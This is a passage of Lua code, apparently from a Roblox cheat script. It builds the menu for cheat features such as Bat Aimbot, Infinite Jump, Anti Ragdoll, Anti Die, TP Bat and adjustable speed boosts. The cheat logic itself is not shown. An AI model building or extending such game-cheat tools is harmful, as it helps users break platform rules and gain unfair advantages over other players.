	title.TextColor3 = C.text
	subtitle.TextColor3 = C.textDim
	closeButton.TextColor3 = C.textMuted
	local pageScales = {}
	local function newPage(name)
	local page = Instance.new("ScrollingFrame")
	page.Name = name .. "Page"
	page.Size = UDim2.new(1, 0, 1, 0)
	page.BackgroundTransparency = 1
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 2
	page.ScrollBarImageColor3 = C.accent
	page.ScrollBarImageTransparency = 0.28
	page.ElasticBehavior = Enum.ElasticBehavior.Always
	page.ScrollingDirection = Enum.ScrollingDirection.Y
	page.AutomaticCanvasSize = Enum.AutomaticSize.Y
	page.CanvasSize = UDim2.new(0, 0, 0, 0)
	page.Visible = name == "Movement"
	page.ZIndex = 5
	page.Parent = content
	local pageScale = Instance.new("UIScale")
	pageScale.Name = "PageTransitionScale"
	pageScale.Scale = 1
	pageScale.Parent = page
	pageScales[name] = pageScale
	local layout = Instance.new("UIListLayout", page)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, MODERN.pageGap)
	local padding = Instance.new("UIPadding", page)
	padding.PaddingLeft = UDim.new(0, 4)
	padding.PaddingRight = UDim.new(0, 4)
	padding.PaddingTop = UDim.new(0, isMobile and 4 or 6)
	padding.PaddingBottom = UDim.new(0, isMobile and 4 or 6)
	return page
	end
	local pages = {
	Movement = newPage("Movement"),
	Combat = newPage("Combat"),
	Visual = newPage("Visual"),
	}

	local function setFeature(featureName, enabled)
	local current = toggleStates[featureName] == true
	if current == enabled then return end
	local toggler = FeatureToggles[featureName]
	if toggler then pcall(toggler) end
	if toggleStates[featureName] ~= enabled then
	toggleStates[featureName] = enabled
	local postToggle = FeaturePostToggle[featureName]
	if postToggle then pcall(postToggle, enabled) end
	end
	local updater = toggleVisualUpdaters[featureName]
	if updater then pcall(updater) end
	pcall(saveConfig)
	end
	local function beginKeybind(button, featureName)
	if listeningBindBtn then
	local previousFeature = listeningFeature
	local previousUpdater = previousFeature and toggleVisualUpdaters[previousFeature]
	if previousUpdater then
	pcall(previousUpdater)
	else
	local previousBind = FeatureKeybinds[previousFeature]
	listeningBindBtn.Text = previousBind and keybindDisplayName(previousBind) or "BIND"
	end
	end
	listeningBindBtn = button
	listeningFeature = featureName
	button.Text = "..."
	end
	local function sectionLabel(parent, text, order)
	local wrapper = Instance.new("Frame")
	wrapper.Size = UDim2.new(1, 0, 0, MODERN.sectionH)
	wrapper.BackgroundTransparency = 1
	wrapper.LayoutOrder = order
	wrapper.Parent = parent
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, 0, 0, isMobile and 14 or 16)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = C.textDim
	label.TextSize = isMobile and 8 or 10
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = wrapper
	end
	local function inlineModeBind(parent, featureName, position)
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Name = "ModeKeybind"
	bind.Size = UDim2.fromOffset(isMobile and 38 or 44, isMobile and 16 or 20)
	bind.Position = position
	bind.BackgroundColor3 = C.accentDim
	bind:SetAttribute("CurtThemeRole", "AccentDim")
	bind.BackgroundTransparency = 0.25
	bind.BorderSizePixel = 0
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 8 or 9
	bind.Font = Enum.Font.GothamBold
	bind.Text = FeatureKeybinds[featureName] and keybindDisplayName(FeatureKeybinds[featureName]) or "-"
	bind.ZIndex = 8
	bind.Parent = parent
	corner(bind, 5); stroke(bind, Color3.fromRGB(55, 55, 60), 1)
	bind.MouseButton1Click:Connect(function()
	beginKeybind(bind, featureName)
	end)
	table.insert(_allBindBtns, bind)

	local previousUpdater = toggleVisualUpdaters[featureName]
	toggleVisualUpdaters[featureName] = function()
	if previousUpdater then pcall(previousUpdater) end
	local key = FeatureKeybinds[featureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.BackgroundColor3 = C.accentDim
	bind:SetAttribute("CurtThemeRole", "AccentDim")
	bind.BackgroundTransparency = 0.25
	bind.TextColor3 = C.text
	end
	return bind
	end
	local function inputRow(parent, labelText, value, order, callback, bindFeatureName)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, MODERN.inputH)
	row.BackgroundColor3 = C.row
	row:SetAttribute("CurtThemeRole", "Row")
	row.BackgroundTransparency = 0.5
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 8); stroke(row, C.divider, 1)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = bindFeatureName and UDim2.new(1, isMobile and -116 or -142, 1, 0) or UDim2.new(0.65, 0, 1, 0)
	label.Position = UDim2.new(0, isMobile and 8 or 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.text
	label.TextSize = MODERN.textSize
	label.TextWrapped = _G.__UnoTabPosition == "Left"
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	if bindFeatureName then
	inlineModeBind(row, bindFeatureName, UDim2.new(1, isMobile and -94 or -116, 0.5, isMobile and -8 or -10))
	end
	local boxFrame = Instance.new("Frame")
	boxFrame.Size = UDim2.new(0, isMobile and 44 or 54, 0, isMobile and 18 or 22)
	boxFrame.Position = UDim2.new(1, isMobile and -51 or -64, 0.5, isMobile and -9 or -11)
	boxFrame.BackgroundColor3 = C.row
	boxFrame:SetAttribute("CurtThemeRole", "Row")
	boxFrame.BackgroundTransparency = 0.15
	boxFrame.BorderSizePixel = 0
	boxFrame.Parent = row
	corner(boxFrame, 6); stroke(boxFrame, Color3.fromRGB(55, 55, 60), 1)
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.new(1, 0, 1, 0)
	box.BackgroundTransparency = 1
	box.Text = tostring(value)
	box.TextColor3 = C.text
	box.TextSize = isMobile and 9 or 11
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.Parent = boxFrame
	box.FocusLost:Connect(function()
	local number = tonumber(box.Text)
	if number then callback(number); box.Text = tostring(number) else box.Text = tostring(value) end
	end)
	end
	local function customSpeedRow(parent, customSpeed, order)
	local row = Instance.new("Frame")
	row.Name = "CustomSpeed_" .. customSpeed.name
	row.Size = UDim2.new(1, 0, 0, 58)
	row.BackgroundColor3 = C.row
	row:SetAttribute("CurtThemeRole", "Row")
	row.BackgroundTransparency = 0.5
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 8); stroke(row, C.divider, 1)

	local selectedMarker = Instance.new("Frame")
	selectedMarker.Size = UDim2.new(0, 3, 0, 36)
	selectedMarker.Position = UDim2.new(0, 4, 0.5, -18)
	selectedMarker.BackgroundColor3 = C.accent
	selectedMarker:SetAttribute("CurtThemeRole", "Accent")
	selectedMarker.BorderSizePixel = 0
	selectedMarker.Parent = row
	corner(selectedMarker, 2)

	local selectButton = keepOriginalText(Instance.new("TextButton"))
	selectButton.Size = UDim2.new(0, 88, 1, 0)
	selectButton.Position = UDim2.new(0, 12, 0, 0)
	selectButton.BackgroundTransparency = 1
	selectButton.Text = customSpeed.name
	selectButton.TextColor3 = C.text
	selectButton.TextSize = 11
	selectButton.Font = Enum.Font.GothamBold
	selectButton.TextXAlignment = Enum.TextXAlignment.Left
	selectButton.Parent = row
	local customFeatureName = "SelectCustomMode_" .. customSpeed.name
	inlineModeBind(row, customFeatureName, UDim2.fromOffset(106, 19))

	local function speedBox(labelText, value, xPosition, onChanged)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.fromOffset(54, 14)
	label.Position = UDim2.fromOffset(xPosition, 5)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.textMuted
	label.TextSize = 8
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.fromOffset(54, 22)
	box.Position = UDim2.fromOffset(xPosition, 24)
	box.BackgroundColor3 = C.bgDark
	box:SetAttribute("CurtThemeRole", "BgDark")
	box.BorderSizePixel = 0
	box.Text = tostring(value)
	box.TextColor3 = C.text
	box.TextSize = 10
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.Parent = row
	corner(box, 5); stroke(box, Color3.fromRGB(55, 55, 60), 1)
	box.FocusLost:Connect(function()
	local number = tonumber(box.Text)
	if not number then box.Text = tostring(value); return end
	number = math.clamp(math.floor(number + 0.5), 1, 200)
	value = number
	box.Text = tostring(number)
	onChanged(number)
	end)
	return box
	end

	speedBox("NORMAL", customSpeed.boost, 158, function(value)
	customSpeed.boost = value
	speedValues["CustomBoost_" .. customSpeed.name] = value
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)
	speedBox("CARRY", customSpeed.steal, 224, function(value)
	customSpeed.steal = value
	speedValues["CustomSteal_" .. customSpeed.name] = value
	saveConfig()
	pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
	end)

	local deleteButton = keepOriginalText(Instance.new("TextButton"))
	deleteButton.Size = UDim2.fromOffset(30, 24)
	deleteButton.Position = UDim2.new(1, -40, 0.5, -12)
	deleteButton.BackgroundColor3 = Color3.fromRGB(72, 34, 34)
	deleteButton.BorderSizePixel = 0
	deleteButton.Text = "X"
	deleteButton.TextColor3 = Color3.fromRGB(255, 180, 180)
	deleteButton.TextSize = 10
	deleteButton.Font = Enum.Font.GothamBold
	deleteButton.Parent = row
	corner(deleteButton, 5)

	local function updateVisual()
	local active = selectedMode == customSpeed.name
	row.BackgroundTransparency = active and 0.28 or 0.5
	selectedMarker.Visible = active
	end
	selectButton.MouseButton1Click:Connect(function()
	selectMode(customSpeed.name)
	end)
	deleteButton.MouseButton1Click:Connect(function()
	for index = #customSpeeds, 1, -1 do
	if customSpeeds[index] == customSpeed then table.remove(customSpeeds, index); break end
	end
	speedValues["CustomBoost_" .. customSpeed.name] = nil
	speedValues["CustomSteal_" .. customSpeed.name] = nil
	FeatureKeybinds[customFeatureName] = nil
	FeatureToggles[customFeatureName] = nil
	if selectedMode == customSpeed.name then selectMode("Normal") end
	row:Destroy()
	saveConfig()
	end)
	FeatureToggles[customFeatureName] = function() selectMode(customSpeed.name) end
	table.insert(_speedCardRefs, { modeName = customSpeed.name, updateVisual = updateVisual })
	updateVisual()
	return row
	end

	local function customSpeedForm(parent, order, onCreated)
	local form = Instance.new("Frame")
	form.Name = "CustomSpeedForm"
	form.Size = UDim2.new(1, 0, 0, 112)
	form.BackgroundColor3 = C.row
	form:SetAttribute("CurtThemeRole", "Row")
	form.BackgroundTransparency = 0.2
	form.BorderSizePixel = 0
	form.LayoutOrder = order
	form.Parent = parent
	corner(form, 8); stroke(form, C.divider, 1)

	local function formLabel(text, x, width)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.fromOffset(width, 14)
	label.Position = UDim2.fromOffset(x, 8)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = C.textMuted
	label.TextSize = 8
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = form
	end
	local function formBox(defaultText, x, width)
	local box = keepOriginalText(Instance.new("TextBox"))
	box.Size = UDim2.fromOffset(width, 24)
	box.Position = UDim2.fromOffset(x, 24)
	box.BackgroundColor3 = C.bgDark
	box:SetAttribute("CurtThemeRole", "BgDark")
	box.BorderSizePixel = 0
	box.Text = defaultText
	box.TextColor3 = C.text
	box.TextSize = 10
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.Parent = form
	corner(box, 5); stroke(box, Color3.fromRGB(55, 55, 60), 1)
	return box
	end
	formLabel("NAME", 12, 150)
	formLabel("NORMAL", 174, 70)
	formLabel("CARRY", 256, 70)
	local nameBox = formBox("Custom " .. tostring(#customSpeeds + 1), 12, 150)
	local normalBox = formBox("59", 174, 70)
	local carryBox = formBox("29", 256, 70)
	local errorLabel = keepOriginalText(Instance.new("TextLabel"))
	errorLabel.Size = UDim2.new(1, -24, 0, 14)
	errorLabel.Position = UDim2.new(0, 12, 1, -20)
	errorLabel.BackgroundTransparency = 1
	errorLabel.Text = ""
	errorLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
	errorLabel.TextSize = 8
	errorLabel.Font = Enum.Font.GothamBold
	errorLabel.TextXAlignment = Enum.TextXAlignment.Left
	errorLabel.Parent = form
	local addButton = keepOriginalText(Instance.new("TextButton"))
	addButton.Size = UDim2.new(1, -24, 0, 26)
	addButton.Position = UDim2.new(0, 12, 0, 62)
	addButton.BackgroundColor3 = C.accentDim
	addButton:SetAttribute("CurtThemeRole", "AccentDim")
	addButton.BorderSizePixel = 0
	addButton.Text = "CREATE CUSTOM SPEED"
	addButton.TextColor3 = C.text
	addButton.TextSize = 10
	addButton.Font = Enum.Font.GothamBold
	addButton.Parent = form
	corner(addButton, 6)
	addButton.MouseButton1Click:Connect(function()
	local name = nameBox.Text:match("^%s*(.-)%s*$")
	local normal = tonumber(normalBox.Text)
	local carry = tonumber(carryBox.Text)
	if not name or #name < 1 then errorLabel.Text = "Escribe un nombre."; return end
	if name:find("[:,=]") then errorLabel.Text = "Names cannot contain : , or =."; return end
	if name == "Normal" or name == "Lagger" or name == "Desync" then errorLabel.Text = "That name is reserved."; return end
	for _, item in ipairs(customSpeeds) do if item.name == name then errorLabel.Text = "That name already exists."; return end end
	if not normal or normal < 1 or normal > 200 then errorLabel.Text = "Normal: elige un valor entre 1 y 200."; return end
	if not carry or carry < 1 or carry > 200 then errorLabel.Text = "Carry: elige un valor entre 1 y 200."; return end
	local customSpeed = { name = name, boost = math.floor(normal + 0.5), steal = math.floor(carry + 0.5) }
	table.insert(customSpeeds, customSpeed)
	speedValues["CustomBoost_" .. name] = customSpeed.boost
	speedValues["CustomSteal_" .. name] = customSpeed.steal
	saveConfig()
	form:Destroy()
	onCreated(customSpeed)
	end)
	return form
	end
	local function toggleRow(parent, labelText, featureName, initial, order, hasKeybind, callback, bindFeatureName)
	local row = Instance.new("Frame")
	row:SetAttribute("UnoButtonThemeControl", true)
	row.Size = UDim2.new(1, 0, 0, hasKeybind and MODERN.toggleBindH or MODERN.toggleH)
	row.BackgroundColor3 = C.row
	row:SetAttribute("CurtThemeRole", "Row")
	row.BackgroundTransparency = 0.5
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 8); stroke(row, C.divider, 1)
	local rowScale = Instance.new("UIScale", row)
	rowScale.Scale = 1
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, -70, 0, hasKeybind and (isMobile and 16 or 20) or MODERN.toggleH)
	label.Position = UDim2.new(0, isMobile and 8 or 12, 0, hasKeybind and (isMobile and 2 or 3) or 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.text
	label.TextSize = MODERN.textSize
	label.TextWrapped = _G.__UnoTabPosition == "Left"
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	local activeMarker = Instance.new("Frame")
	activeMarker.Name = "ActiveMarker"
	activeMarker.Size = UDim2.new(0, 3, 0, isMobile and 18 or 24)
	activeMarker.Position = UDim2.new(0, 4, 0.5, isMobile and -9 or -12)
	activeMarker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	activeMarker.BorderSizePixel = 0
	activeMarker.Visible = false
	activeMarker.Parent = row
	corner(activeMarker, 2)
	local switchTrack = Instance.new("Frame")
	switchTrack.Name = "ToggleSwitch"
	switchTrack.Size = UDim2.new(0, isMobile and 34 or 40, 0, isMobile and 16 or 20)
	switchTrack.Position = UDim2.new(1, isMobile and -42 or -50, 0.5, isMobile and -8 or -10)
	switchTrack.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
	switchTrack:SetAttribute("CurtThemeRole", "BgDark")
	switchTrack.BorderSizePixel = 0
	switchTrack.ZIndex = 8
	switchTrack.Parent = row
	corner(switchTrack, 20)
	stroke(switchTrack, C.divider, 1)
	local switchKnob = Instance.new("Frame")
	switchKnob.Name = "Knob"
	switchKnob.Size = UDim2.new(0, isMobile and 12 or 16, 0, isMobile and 12 or 16)
	switchKnob.Position = UDim2.new(0, 2, 0.5, isMobile and -6 or -8)
	switchKnob.BackgroundColor3 = Color3.fromRGB(210, 210, 215)
	switchKnob:SetAttribute("CurtThemeRole", "SwitchKnob")
	switchKnob.BorderSizePixel = 0
	switchKnob.ZIndex = 9
	switchKnob.Parent = switchTrack
	corner(switchKnob, 20)
	local keyFeatureName = bindFeatureName or featureName
	if hasKeybind and keyFeatureName then
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Size = UDim2.new(0, isMobile and 36 or 42, 0, isMobile and 14 or 17)
	bind.Position = UDim2.new(0, isMobile and 8 or 12, 1, isMobile and -17 or -21)
	bind.BackgroundColor3 = C.accentDim
	bind:SetAttribute("CurtThemeRole", "AccentDim")
	bind.BackgroundTransparency = 0.35
	bind.BorderSizePixel = 0
	local key = FeatureKeybinds[keyFeatureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 8 or 9
	bind.Font = Enum.Font.GothamBold
	bind.Parent = row
	corner(bind, 5)
	bind.MouseButton1Click:Connect(function() beginKeybind(bind, keyFeatureName) end)
	table.insert(_allBindBtns, bind)
	end
	local active = initial == true
	local visualInitialized = false
	local function updateVisual(value)
	active = value == true
	local targetColor = C.row
	local targetTransparency = 0.5
	activeMarker.Visible = false
	local trackColor = active and C.accent or Color3.fromRGB(42, 42, 48)
	switchTrack:SetAttribute("SwitchActive", active)
	switchTrack:SetAttribute("CurtThemeRole", active and "Accent" or "BgDark")
	local knobPosition = active
		and UDim2.new(1, isMobile and -14 or -18, 0.5, isMobile and -6 or -8)
		or UDim2.new(0, 2, 0.5, isMobile and -6 or -8)
	if visualInitialized then
	tween(row, {
	BackgroundColor3 = targetColor,
	BackgroundTransparency = targetTransparency,
	}, 0.18)
	tween(switchTrack, { BackgroundColor3 = trackColor }, 0.18)
	tween(switchKnob, { Position = knobPosition }, 0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	else
	row.BackgroundColor3 = targetColor
	row.BackgroundTransparency = targetTransparency
	switchTrack.BackgroundColor3 = trackColor
	switchKnob.Position = knobPosition
	visualInitialized = true
	end
	end
	updateVisual(active)
	local button = Instance.new("TextButton")
	keepOriginalText(button)
	button.Size = UDim2.new(1, 0, 1, 0)
	button.Position = UDim2.new(0, 0, 0, 0)
	button.BackgroundTransparency = 1
	button.Text = ""
	button.ZIndex = 0
	button.Parent = row
	button.MouseButton1Click:Connect(function()
	rowScale.Scale = 0.985
	tween(rowScale, {Scale = 1}, 0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local desired = not active
	callback(desired)
	updateVisual(featureName and toggleStates[featureName] == true or desired)
	end)
	if featureName then
	toggleVisualUpdaters[featureName] = function() updateVisual(toggleStates[featureName] == true) end
	end
	return updateVisual, row
	end
	local function modeButton(row, initialText, callback)
	local button = keepOriginalText(Instance.new("TextButton"))
	button:SetAttribute("UnoModeButton", true)
	-- A selector goes before an ON/OFF switch; standalone selectors stay right-aligned.
	local rowHasSwitch = row:FindFirstChild("ToggleSwitch") ~= nil
	button.Size = UDim2.new(0, isMobile and 42 or 52, 0, isMobile and 16 or 20)
	local selectorRightOffset = rowHasSwitch
		and (isMobile and 100 or 120)
		or (isMobile and 94 or 108)
	button.Position = UDim2.new(1, -selectorRightOffset, 0.5, isMobile and -8 or -10)
	button.BackgroundColor3 = C.accentDim
	button:SetAttribute("CurtThemeRole", "AccentDim")
	button.BackgroundTransparency = 0.25
	button.BorderSizePixel = 0
	button.Text = initialText
	button.TextColor3 = C.text
	button.TextSize = isMobile and 8 or 9
	button.Font = Enum.Font.GothamBold
	button.ZIndex = 8
	button.Parent = row
	corner(button, 5); stroke(button, Color3.fromRGB(45, 45, 45), 1)
	local buttonScale = Instance.new("UIScale", button)
	buttonScale.Scale = 1
	button.MouseButton1Click:Connect(function()
	buttonScale.Scale = 0.92
	tween(buttonScale, {Scale = 1}, 0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local newText = callback()
	if newText then button.Text = tostring(newText) end
	end)
	return button
	end
	local function actionRow(parent, labelText, featureName, order, action)
	local row = Instance.new("Frame")
	row:SetAttribute("UnoButtonThemeControl", true)
	row.Size = UDim2.new(1, 0, 0, MODERN.actionH)
	row.BackgroundColor3 = C.row
	row:SetAttribute("CurtThemeRole", "Row")
	row.BackgroundTransparency = 0.5
	row.BorderSizePixel = 0
	row.LayoutOrder = order
	row.Parent = parent
	corner(row, 8); stroke(row, C.divider, 1)
	local rowScale = Instance.new("UIScale", row)
	rowScale.Scale = 1
	local label = keepOriginalText(Instance.new("TextButton"))
	label.Size = UDim2.new(1, featureName and -64 or -24, 1, 0)
	label.Position = UDim2.new(0, isMobile and 8 or 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Text = labelText
	label.TextColor3 = C.text
	label.TextSize = MODERN.textSize
	label.TextWrapped = _G.__UnoTabPosition == "Left"
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = row
	label.MouseButton1Click:Connect(function()
	rowScale.Scale = 0.985
	tween(rowScale, {Scale = 1}, 0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	action()
	end)
	if featureName then
	local bind = keepOriginalText(Instance.new("TextButton"))
	bind.Name = tostring(featureName):gsub("%s+", "") .. "Keybind"
	bind.Size = UDim2.new(0, isMobile and 38 or 44, 0, isMobile and 18 or 22)
	bind.Position = UDim2.new(1, isMobile and -45 or -54, 0.5, isMobile and -9 or -11)
	bind.BackgroundColor3 = C.accentDim
	bind:SetAttribute("CurtThemeRole", "AccentDim")
	bind.BackgroundTransparency = 0.35
	bind.BorderSizePixel = 0
	local key = FeatureKeybinds[featureName]
	bind.Text = key and keybindDisplayName(key) or "-"
	bind.TextColor3 = C.text
	bind.TextSize = isMobile and 8 or 9
	bind.Font = Enum.Font.GothamBold
	bind.Parent = row
	corner(bind, 5)
	bind.MouseButton1Click:Connect(function() beginKeybind(bind, featureName) end)
	table.insert(_allBindBtns, bind)
	end
	return row
	end

	local movement = pages.Movement
	sectionLabel(movement, "SPEED CONFIGURATION", 0)
	inputRow(movement, "Normal Speed", speedValues.NormalBoost, 1, function(value) speedValues.NormalBoost = math.max(1, math.floor(value)); normalSpeed = speedValues.NormalBoost; pcall(function() if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end end); saveConfig() end, "SelectNormalMode")
	inputRow(movement, "Carry Speed", speedValues.NormalSteal, 2, function(value) speedValues.NormalSteal = math.max(1, math.floor(value)); carrySpeed = speedValues.NormalSteal; pcall(function() if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end end); saveConfig() end)
	sectionLabel(movement, "LAGGER SPEED", 3)
	inputRow(movement, "Lagger Normal", speedValues.LaggerBoost, 4, function(value) speedValues.LaggerBoost = math.max(1, math.floor(value)); laggerSpeed = speedValues.LaggerBoost; saveConfig() end, "SelectLaggerMode")
	inputRow(movement, "Lagger Carry", speedValues.LaggerSteal, 5, function(value) speedValues.LaggerSteal = math.max(1, math.floor(value)); saveConfig() end)

	sectionLabel(movement, "CONTROLS", 60)
	local _, autoplayUiRow = toggleRow(movement, "Auto Play", "Autoplay", toggleStates["Autoplay"], 61, true, function(on) setFeature("Autoplay", on) end)
	modeButton(autoplayUiRow, string.upper(_G.__autoplayMode or "Full"), function()
	_G.__autoplayMode = (_G.__autoplayMode == "Semi") and "Full" or "Semi"
	saveConfig()
	return string.upper(_G.__autoplayMode)
	end)
	toggleRow(movement, "Carry Speed", "Carry Speed", toggleStates["Carry Speed"], 63, false, function(on) setFeature("Carry Speed", on) end)
	sectionLabel(movement, "MOVEMENT SETTINGS", 70)
	local _, infJumpUiRow = toggleRow(movement, "Infinite Jump", "Inf Jump", toggleStates["Inf Jump"], 71, false, function(on) setFeature("Inf Jump", on) end)
	modeButton(infJumpUiRow, string.upper(_G.__UnoInfJumpMode or "hold"), function()
	_G.__UnoInfJumpMode = (_G.__UnoInfJumpMode or "hold") == "hold" and "manual" or "hold"
	if toggleStates["Inf Jump"] then
	if _G.__UnoInfJumpMode == "hold" and startInfJump then
	pcall(startInfJump)
	elseif stopInfJump then
	pcall(stopInfJump)
	end
	end
	saveConfig()
	return string.upper(_G.__UnoInfJumpMode)
	end)
	toggleRow(movement, "Unwalk", "Unwalk", toggleStates["Unwalk"], 72, false, function(on)
	setFeature("Unwalk", on)
	end)
	sectionLabel(movement, "TP DOWN", 73)
	toggleRow(movement, "Auto TP Down", "Auto TP Down", toggleStates["Auto TP Down"], 74, false, function(on)
	setFeature("Auto TP Down", on)
	end)
	inputRow(movement, "Height (studs)", speedValues.AutoTPDownHeight, 75, function(value)
	speedValues.AutoTPDownHeight = math.clamp(math.floor(value + 0.5), 1, 1000)
	saveConfig()
	end)

	local combat = pages.Combat
	sectionLabel(combat, "BAT CONTROLS", 0)
	toggleRow(combat, "Bat Aimbot", "Aimbot", toggleStates.Aimbot, 1, true, function(on) setFeature("Aimbot", on) end)
	toggleRow(combat, "Ragdoll Counter", "Ragdoll Counter", toggleStates["Ragdoll Counter"], 4, false, function(on) setFeature("Ragdoll Counter", on) end)
	sectionLabel(combat, "RAGDOLL", 5)
	toggleRow(combat, "Anti Ragdoll", "Anti Ragdoll", toggleStates["Anti Ragdoll"], 6, false, function(on) setFeature("Anti Ragdoll", on) end)
	toggleRow(combat, "Medusa Counter", "Medusa Counter", toggleStates["Medusa Counter"], 7, false, function(on) setFeature("Medusa Counter", on) end)
	toggleRow(combat, "Anti Die", "Anti Die", toggleStates["Anti Die"], 8, false, function(on) setFeature("Anti Die", on) end)
	sectionLabel(combat, "TP BAT", 9)

	local _, tpBatUiRow = toggleRow(combat, "TP Bat", "TP Bat", toggleStates["TP Bat"], 10, false, function(on) setFeature("TP Bat", on) end)
	tpBatUiRow.ClipsDescendants = true

	local tpBatConfigToggle = keepOriginalText(Instance.new("TextButton"))
	tpBatConfigToggle.Name = "TPBatConfigToggle"
	tpBatConfigToggle.Size = UDim2.new(0, isMobile and 52 or 64, 0, isMobile and 18 or 22)
	tpBatConfigToggle.Position = UDim2.new(1, isMobile and -102 or -122, 0, isMobile and 5 or 7)
	tpBatConfigToggle.BackgroundColor3 = C.accentDim
	tpBatConfigToggle:SetAttribute("CurtThemeRole", "AccentDim")
	tpBatConfigToggle.BackgroundTransparency = 0.2
	tpBatConfigToggle.BorderSizePixel = 0
	tpBatConfigToggle.Text = ""
	tpBatConfigToggle.AutoButtonColor = false
	tpBatConfigToggle.ZIndex = 12
	tpBatConfigToggle.Parent = tpBatUiRow
	corner(tpBatConfigToggle, 6); stroke(tpBatConfigToggle, Color3.fromRGB(70, 75, 84), 1)

	local tpBatConfigLabel = keepOriginalText(Instance.new("TextLabel"))
	tpBatConfigLabel.Size = UDim2.new(0, 30, 1, 0)
	tpBatConfigLabel.Position = UDim2.new(0, 5, 0, 0)
	tpBatConfigLabel.BackgroundTransparency = 1
	tpBatConfigLabel.Text = "GUI"
	tpBatConfigLabel.TextColor3 = C.text
	tpBatConfigLabel.TextSize = 8
	tpBatConfigLabel.Font = Enum.Font.GothamBold
	tpBatConfigLabel.TextXAlignment = Enum.TextXAlignment.Left
	tpBatConfigLabel.ZIndex = 13
	tpBatConfigLabel.Parent = tpBatConfigToggle

	local tpBatConfigTrack = Instance.new("Frame")
	tpBatConfigTrack.Size = UDim2.new(0, 24, 0, 12)
	tpBatConfigTrack.Position = UDim2.new(1, -29, 0.5, -6)
	tpBatConfigTrack.BackgroundColor3 = Color3.fromRGB(30, 31, 35)
	tpBatConfigTrack.BorderSizePixel = 0
	tpBatConfigTrack.ZIndex = 13
	tpBatConfigTrack.Parent = tpBatConfigToggle
	corner(tpBatConfigTrack, 20)
	local tpBatConfigKnob = Instance.new("Frame")
	tpBatConfigKnob.Size = UDim2.new(0, 8, 0, 8)
	tpBatConfigKnob.Position = UDim2.new(0, 2, 0.5, -4)
	tpBatConfigKnob.BackgroundColor3 = Color3.fromRGB(155, 165, 180)
	tpBatConfigKnob.BorderSizePixel = 0
	tpBatConfigKnob.ZIndex = 14
	tpBatConfigKnob.Parent = tpBatConfigTrack
	corner(tpBatConfigKnob, 20)

	local tpBatInlineBind = keepOriginalText(Instance.new("TextButton"))
	tpBatInlineBind.Name = "TPBatInlineKeybind"
	tpBatInlineBind:SetAttribute("MiniUIBind", true)
	tpBatInlineBind.Size = UDim2.new(0, isMobile and 36 or 42, 0, isMobile and 18 or 22)
	tpBatInlineBind.Position = UDim2.new(1, isMobile and -146 or -172, 0, isMobile and 5 or 7)
	tpBatInlineBind.BackgroundColor3 = C.accentDim
	tpBatInlineBind:SetAttribute("CurtThemeRole", "AccentDim")
	tpBatInlineBind.BackgroundTransparency = 0.25
	tpBatInlineBind.BorderSizePixel = 0
	tpBatInlineBind.Text = FeatureKeybinds["TP Bat"] and keybindDisplayName(FeatureKeybinds["TP Bat"]) or "-"
	tpBatInlineBind.TextColor3 = C.text
	tpBatInlineBind.TextSize = isMobile and 8 or 9
	tpBatInlineBind.Font = Enum.Font.GothamBold
	tpBatInlineBind.AutoButtonColor = false
	tpBatInlineBind.ZIndex = 12
	tpBatInlineBind.Parent = tpBatUiRow
	corner(tpBatInlineBind, 5); stroke(tpBatInlineBind, Color3.fromRGB(55, 55, 60), 1)
	tpBatInlineBind.MouseButton1Click:Connect(function()
